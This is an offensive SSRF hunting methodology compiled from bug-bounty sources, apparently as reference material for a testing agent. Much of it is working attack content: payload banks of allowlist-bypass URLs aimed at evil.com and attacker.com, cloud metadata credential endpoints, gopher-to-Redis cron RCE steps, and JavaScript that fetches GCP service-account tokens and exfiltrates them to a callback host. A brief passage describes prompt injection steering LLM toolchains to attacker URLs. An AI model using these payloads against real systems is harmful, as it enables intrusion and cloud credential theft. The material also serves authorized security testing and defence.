# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.
- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.
- Test the response body, status code, timing, and error text for internal reachability.
- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.
- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).

### Deeper checklist

- Find URL inputs: webhooks, avatars, imports, previews, PDF/render, RSS, OAuth metadata.
- Use a callback domain first to confirm outbound requests (DNS + HTTP).
- Test internal targets: 127.0.0.1, localhost, [::1], 169.254.169.254, RFC1918, internal hostnames.
- Bypass filters with decimal/octal/hex IPs, DNS rebinding, redirects, userinfo, and URL parsing quirks.
- Try non-HTTP schemes: gopher, file, dict, ftp, and cloud metadata endpoints.
- Check redirect-following and allowlist bypass via open redirects on trusted domains.
- Escalate to credential theft, internal API access, or port scanning with evidence.

### Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

### Web-Research Methodology Additions (2026)

Sourced from current PortSwigger Web Security Academy / Research, HackTricks, and a 2026 GitHub Security Advisory (see D). These extend — not replace — the OOB gate above: every blind claim still needs a Collaborator/interactsh hit.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **Full-URL parameters (obvious sinks):** `url`, `uri`, `link`, `src`, `source`, `dest`, `target`, `endpoint`, `fetch`, `load`, `image`, `avatar`, `webhook`, `callback`, `feed`, `proxy`, `next`, `redirect`, `return`, `rurl`.
- **Partial-URL / hostname-only inputs** (PortSwigger "hidden attack surface"): params carrying only a host or path that are concatenated into a full URL server-side — `host=`, `domain=`, `path=`, `file=`. They are easy to miss because the value does not look like a URL.
- **URLs inside data formats:** XML/XXE external entities, DSPL/CSV remote schemas, SVG `<image xlink:href>`, JSON bodies with `url` / `@id` / `contentUrl`, feed (RSS/Atom) parsers, webhook registration, OAuth/SSO metadata-URL fields.
- **Non-obvious header surface:** the `Referer` header is a documented blind-SSRF sink (server-side analytics visitors fetch third-party URLs seen in Referer). Also test `X-Forwarded-Host`, `X-Original-URL`, `Host`, `Origin` when reflected into fetches.
- **File types that render server-side:** PDF generators (wkhtmltopdf, WeasyPrint, PDFBox, pd4ml), screenshotters (Puppeteer/Playwright/PhantomJS), image processors, document converters.
- **JS bundle grep:** `grep -Eo "fetch\(|axios\.[a-z]+\(|XMLHttpRequest|URL\(" bundle.js` then verify a user variable actually reaches the URL argument.

Server-side-rendering injection shapes (HackTricks / YesWeHack):
```
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip" />
<meta http-equiv="refresh" content="0; file:///etc/hosts">
```

- **Workflow:** (1) spider + `ffuf`/`katana` for the endpoint patterns; (2) plant one unique `interactsh-client` / Collaborator payload per candidate parameter; (3) confirm DNS+HTTP callback before touching internal targets; (4) only then aim at metadata services.

Metadata endpoints to try once a sink is confirmed (HackTricks cloud-ssrf):
```
AWS IMDSv1   http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2   needs PUT /latest/api/token + X-aws-ec2-metadata-token header
AWS IPv6     http://[fd00:ec2::254]/latest/meta-data/   (Nitro, IPv6 enabled)
AWS ECS      http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  (read /proc/self/environ first)
AWS EKS      http://169.254.170.23/v1/credentials  (+ token from /var/run/secrets/pods.eks.amazonaws.com/...)
GCP          http://metadata.google.internal/computeMetadata/v1/  (header Metadata-Flavor: Google)
GCP token    .../instance/service-accounts/default/token ; ID token: .../default/identity?audience=https://target
Azure VM     http://169.254.169.254/metadata/instance?api-version=2021-12-13  (header Metadata: true, NO X-Forwarded-For)
Azure nohdr  http://169.254.169.254/metadata/v1/instanceinfo  (no Metadata header required)
App Service  $IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01 (+ X-IDENTITY-HEADER)
Alibaba      http://100.100.100.200/latest/meta-data/
DigitalOcean http://169.254.169.254/metadata/v1.json
Oracle OCI   http://169.254.169.254/opc/v2/instance/  (header Authorization: Bearer Oracle)
etcd         http://127.0.0.1:2379/v2/keys/?recursive=true
```

### Part 6 — Step-by-step hunting methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.
2. **Set up an OOB detector** — Burp Collaborator, interactsh, or canarytokens — with a unique per-test callback domain.
3. **Send your callback URL as the parameter value first** (blind check before anything else): `url=https://YOUR.interactsh.com/test`. Confirm the server makes an outbound connection. This proves execution before attempting internal targets.
4. **Test internal cloud metadata endpoints** (see §2.2).
5. **Test localhost and common internal ports** (see §2.1).
6. **Test redirect-based bypasses early** — if the app validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses.
7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers): inject `<script>` tags that make XMLHttpRequest/fetch calls to internal services; exfil via DNS by encoding response data in subdomains.
8. **Enumerate the internal network** using timing differences and error message variation — port scan via response time (connection refused vs timeout), check error text for hostname/IP leakage.
9. **Chain findings** — if you have SSRF to internal services, look for unauthenticated admin endpoints, Redis/memcached (protocol smuggling), internal OAuth token endpoints, SSRF → CSRF → RCE (GitHub Enterprise pattern).
10. **Document the full chain** with screenshots of each hop before reporting.

Then apply §5.1 (path model) and §5.2 (sink inventory) for source review, and §5.3 (E0–E5) before scoring.

---

## Signals and surfaces

### Signal

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`url` `uri` `link` `image` `avatar` `webhook` `callback` `feed` `proxy` `next` `dest` `host` `domain` `site` `fetch` `load`

### Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

### Response Header Signals

```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals

- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

### Signal (from 337 disclosed HackerOne reports)

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**
- Corpus: `~/.local/share/hackerone-reports/`

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---:|---:|---:|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

### Crown jewel targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes, microservice meshes, internal APIs). Prioritize:

- **Cloud-hosted SaaS products** — GCP metadata `metadata.google.internal` / `169.254.169.254`, AWS IMDSv1/IMDSv2, Azure IMDS
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset / file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** — GitHub Enterprise, GitLab — SSRF frequently chains to RCE via internal services
- **Agentic / LLM toolchains** — fetch tools, browser navigation, RAG document loaders, workflow HTTP nodes, MCP server discovery
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots / PDF — extremely high value

---

### 1.3 Attack surface signals

URL patterns to hunt:

```
/api/*/preview    /api/*/fetch      /api/*/import     /api/*/webhook
/api/*/proxy      /api/*/render     /api/*/link       /api/*/screenshot
/api/*/export     /api/*/validate
?url= ?uri= ?endpoint= ?redirect= ?src= ?source= ?feed= ?host=
?target= ?dest= ?file= ?path= ?callback= ?image= ?load= ?fetch=
```

JS patterns (grep client-side bundles):

```javascript
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

Response header signals:

```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

Tech stack signals (higher likelihood of payoff):
- Kubernetes — aggregated APIs, metrics endpoints
- GCP — Compute Engine/GKE URL fetchers
- Node.js/Python using requests, node-fetch, axios
- Headless browsers used for screenshots/PDF
- XML/DSPL/CSV import features — XXE-style SSRF
- OAuth/webhook registration endpoints

## Techniques, payloads and bypasses

### Payloads & probes

- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`
- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`
- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`
- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`
- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`

### Payload bank

**85 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Allowlist & parser bypass

```text
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### Bypass tricks

- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.
- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.
- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.
- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.
- Use open redirects on allowlisted hosts to reach internal targets.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **SSRF in Exchange leads to ROOT access in all instances** — `#341876` · Shopify · $0 · ▲587
  > However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.
- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — `#530974` · Snapchat · $0 · ▲421
  > - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)
- **SSRF on project import via the remote_attachment_url on a Note** — `#826361` · GitLab · $10,000 · ▲359
  > A POST request is not possible here, but as `remote attachment request header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L169) and not blacklisted, the payload could be set via a header.
- **Server Side Request Forgery mitigation bypass** — `#632101` · GitLab · $0 · ▲350
  > After the hook has executed, you should see content of `http://169.254.169.254` returned.
- **Blind SSRF to internal services in matrix preview_link API** — `#1960765` · Reddit · $6,000 · ▲344
  > Visit the https://matrix.redditspace.com/ matrix/media/r0/preview url/?url=
- **TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services** — `#333419` · Slack · $3,500 · ▲323
  > UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766 section-10 ).
- **SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]** — `#549882` · Vimeo · $0 · ▲276
  > For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437
- **Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion** — `#1189367` · Evernote · $0 · ▲264
  > The payload is base64 encoded of : `file:///home/abenavides/ .js`
- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261
  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .
- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — `#398799` · GitLab · $4,000 · ▲238
  > - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below.
- **Full Read SSRF on Gitlab's Internal Grafana** — `#878779` · GitLab · $0 · ▲229
  > On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted.
- **SSRF in webhooks leads to AWS private keys disclosure** — `#508459` · Omise · $0 · ▲214
  > As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`
- **Stored XSS & SSRF in Lark Docs** — `#892049` · Lark Technologies · $3,000 · ▲178
  > A stored XSS (cross site scripting) vulnerability was discovered in Lark Docs that could be escalated into a Server Side Request Forgery (SSRF) vulnerability if opened in a headless browser on the Lark server.
- **SSRF on duckduckgo.com/iu/** — `#398641` · DuckDuckGo · $0 · ▲165
  > `https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:
- **Server Side Request Forgery** — `#644238` · Lark Technologies · $0 · ▲164
  > https://jinone.github.io/bugbounty-a-simple-ssrf/
- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — `#1062888` · TikTok · $2,727 · ▲162
  > Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign).
- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161
  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.
- **SSRF chained to hit internal host leading to another SSRF which allows to read internal images.** — `#826097` · PlayStation · $1,000 · ▲148
  > Using SSRF to open this URL: https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00 09 000/container/US/en/999/UP4134-CUSA00329 00-ONNTGAME00000001/1429722215000/image%3f version%3d00 09…
- **DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool** — `#3176157` · PortSwigger Web Security · $0 · ▲144
  > Step2: Setup a DNS server for a domain that you controls that answers the first DNS request on this domain with the IP of a server he controls (in this example 192.168.80.154), and all other DNS requests with 127.0.0.1.
- **Blind SSRF on errors.hackerone.net due to Sentry misconfiguration** — `#374737` · HackerOne · $3,500 · ▲143
  > So I tried to simulate error report with malformed "filename" parameter and got callback on my website from 54.186.141.19 IP.
- **SSRF in https://couriers.indrive.com/api/file-storage** — `#2300358` · inDrive · $0 · ▲141
  > If you request any website like for example ` www.google.com `, ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response
- **Server Side Request Forgery (SSRF) in webhook functionality** — `#2301565` · HackerOne · $2,500 · ▲140
  > It occurs when an attacker tricks a server into making requests on their behalf.
- **SSRF on music.line.me through getXML.php** — `#746024` · LY Corporation · $4,500 · ▲135
  > The reporter found an endpoint through which limited SSRF could be achieved.
- **SSRF In Get Video Contents** — `#643622` · Semrush · $0 · ▲125
  > I use URL: `https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/`, and the response is `{"status":404,"error":"Invalid url 'https:\/\/1:@127.0.0.1:\\@@@@w.youtube.com\/@https:\/www.youtube.com\/' (Status code 404)"}`.(PIC3)
- **Full read SSRF via Lark Docs `import as docs` feature** — `#1409727` · Lark Technologies · $5,000 · ▲124
  > A SSRF (server side request forgery) vulnerability was found in the LarkDocs using the "import as docs" feature, which could have potentially been used to access services running on the internal network.
- **Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration** — `#1832494` · EXNESS · $0 · ▲120
  > `https://my.exnessaffiliates.com/api/partner integrations/template/probe`
- **Server-Side Request Forgery (SSRF) via Game Export API** — `#3165242` · Lichess · $0 · ▲116
  > Make a request to: `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/ `
- **SSRF on image renderer** — `#811136` · PlayStation · $1,000 · ▲103
  > image.api.np.km.playstation.net allows image urls to be passed via the `image` parameter
- **Header modification results in disclosure of Slack infra metadata to unauthorized parties** — `#727330` · Slack · $0 · ▲97
  > So, with the blind SSRF vulnerability, the attackers can send arbitrary requests to the intranet, ex: port scanning by identifying the response delay time, to know 169.265.169.254:443 is closed, 169.265.169.254:80 is opened...and so on.
- **[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier** — `#2932960` · Stripo Inc · $0 · ▲92
  > The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `http://[fe80::1%25eth0]/` |
| 4× | `fe80::1%eth0` |
| 3× | `(scheme, hostname, port)` |
| 2× | `https://<your-attacker-server>/redir.php` |
| 2× | `RealPlayerApi.apply()` |
| 2× | `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` |
| 2× | `{readapi.<url_here>}` |
| 2× | `http.<url>.proxy` |
| 2× | `..%2F..%2Fapi/v0/shutdown` |
| 2× | `%2F` |
| 2× | `fe80::1%1` |
| 2× | `%eth0` |
| 2× | `Unknown mime-type: text/html; charset=UTF-8` |
| 2× | `Curl_idn_decode()` |
| 2× | `$('.upgradeToAdmin').click(function () { / let t = $('input[name="username"]').val(); / $.get('/admin/upgrade?username=' + t, function () {` |
| 2× | `POST /hate-mail-generator/new/preview HTTP/1.1 / Host: hackyholidays.h1ctf.com / ...... / preview_markup=Hello,{{name}}&preview_data={"name` |
| 2× | `{{}}` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; / // iframes d` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; / </script>` |
| 1× | `curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Co` |

### Server Side Request Forgery mitigation bypass

`#632101` · GitLab · $0 · high · 2020-04-18 · ▲350
> This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response. This is possible due to flawed DNS rebinding protection. The attack is possible due to flaw here: https://gitlab.com/gitlab-org/gitlab-ce/blob/108c3cf16bed5733ffae086fb62c226961356560/lib/gitlab/url blocker.rb L59 The validate function performs DNS lookup to check whether the IP address of a domain belongs to the local network.

### Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

### B. Techniques & bypasses — specific actionable techniques and payload shapes, not generic advice

- **Blacklist bypass (PortSwigger):** alternative loopback representations `2130706433`, `017700000001`, `127.1`, `0`, `0x7f000001`; a domain you control resolving to `127.0.0.1`; URL-encoding / case variation / double-encoding of blocked strings.
- **Whitelist bypass via URL-parser confusion:** credentials `@` (`https://allowed.com:pass@evil.com/`), fragment (`https://evil.com#allowed.com`), DNS hierarchy (`https://allowed.com.evil.com`), double-encoded `#` (`%2523`). PortSwigger lab chain: `http://username%2523@stock.weliketoshop.net/` made the back end connect to host `username`.
- **PortSwigger URL validation bypass cheat sheet** (Intruder-friendly wordlist) — representative shapes:
```
https://%09web-attacker.com/                 ; https://[::1]/ ; https://[::ffff:127.0.0.1]/
https://%40/                                 ; http:\\web-attacker.com\ ; https://\l\o\c\a\l\h\o\s\t/
https://00000177.00000000.00000000.00000001/ ; https://127.1/ ; https://%E2%91%AB7.0.0.2/
https://%E2%80%8Blocalhost/                  ; https://localho%EF%AC%86/
https://example.com%2523web-attacker.com/    ; https://example.com?%40web-attacker.com/
https://web-attacker.com.example.com/        ; https://example.com.;.web-attacker.com/
%0Dhttp%0D://web-attacker.com                ; %1Chttp://web-attacker.com
```
- **Redirect-based filter bypass:** point the allowlisted URL at an open redirect on the allowed host — `/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin` — or host your own 302/303/307 to `169.254.169.254`. Switching `http:`→`https:` during the redirect has defeated some anti-SSRF filters; vary status code and protocol with a small Python redirect server or `ffuf`.
- **DNS rebinding (TOCTOU) — 2026 advisory pattern, CVE-2026-54020 (Open WebUI):** validator resolves the hostname once, HTTP client resolves again at connect time. Serve TTL=0 answers alternating a public IP and `169.254.169.254` (`rebind.network`, custom CoreDNS, `singularity-of-your-origin`). The advisory had five sibling sinks — retrieval loader, content probe, chat `image_url`, image edit, OAuth picture fetch — so after one is fixed, re-test every other fetch path. A real fix pins the validated IP at the connection layer (transport adapter), not ahead of it.
- **Gopher protocol smuggling:** if `gopher://` is allowed, `gopherus --exploit redis` / `--exploit mysql` / `--exploit fastcgi` emits a URL issuing raw TCP commands (Redis `CONFIG SET dir /var/spool/cron` + `BGSAVE` → cron RCE). Some HTTP clients need a 302 from the attacker host to the gopher URL first.
- **CRLF header injection into IMDS:** when the sink will not let you set headers directly, inject `Metadata: true` (Azure) or `Metadata-Flavor: Google` (GCP) via `%0D%0A` in a URL path/header field. The Azure DevOps Service Hooks report chained exactly this with rebinding to reach IMDS.

### 1.4 First payloads (before reaching for advanced bypasses)

```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://metadata.google.internal/computeMetadata/v1/
```

If any of these work outright, you likely don't need any advanced bypass. If all are blocked, move to Part 4.

Also test both HTTP and HTTPS variants, and try protocol smuggling (`gopher://`, `dict://`, `file://`, `ftp://`) if the fetcher is a generic library (curl, Guzzle, requests) rather than a hardened HTTP-only client.

---

### Part 2 — Payload bank

85+ curated payloads grouped by context. Try in order, stop at the first hit, then minimize. These are seeds — not a substitute for understanding the sink.

### 2.3 Allowlist & parser bypass (basic)

```
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### 2.10 JavaScript-execution context payloads (headless / PDF)

```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### 2.11 App-layer input-encoding bypass

When the endpoint takes the target URL wrapped/encoded — a base64 blob in the path, a double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the raw input while the backend decodes before fetching. Encode the internal target so the filter never sees 169.254/localhost:

```
GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js          # base64 = http://169.254.169.254/  (reports/1189367)
url=http%253A%252F%252F169.254.169.254%252F                 # double URL-encode
```

Test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.

### 2.12 Path-normalization / semicolon bypass

When a front-end blocks `url=` to internal hosts but the origin re-normalizes path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge routes it as benign but the origin resolves the SSRF fetch:

```
GET /;/;/resource/md/get/url?url=http://oast.example/       # edge ignores, origin fetches (reports/2035332)
```

---

### 4.5 Allowlist string-prefix bypasses

For naive checks like `ALLOWED_DOMAINS.some(d => url.startsWith(d))`:

```
# Suffix injection
https://docs.trusted.com.evil.com/payload
# Userinfo injection — trusted domain appears before @, real target is after
https://docs.trusted.com@evil.com/payload
```

Increasingly seen in LLM toolchains/API chains, where prompt injection forges "documentation" to steer a BASE URL rather than directly controlling a URL parameter. Also LangChain CVE-2026-26019/27795 (§4.19).

### 4.6 CDN / edge path-normalization bypasses

Edge platforms (Cloudflare Workers, Vercel Edge, Netlify Functions) normalize URLs differently from the origin — a path segment the edge treats as a static asset gets re-normalized by the origin into an external request. Example: OpenNext's `@opennextjs/cloudflare` `/cdn-cgi/image/` handler.

```
https://victim-site.com/cdn-cgi/image/aaaa/https://attacker.com/...
```

Same class as `;/` and `/../` path-confusion, but the carrier is the edge's image/resize handler. When the target runs on an edge platform, test the edge handler path itself, not just app-layer params.

### 4.8 Bypassing IMDSv2 / Azure Metadata via header injection

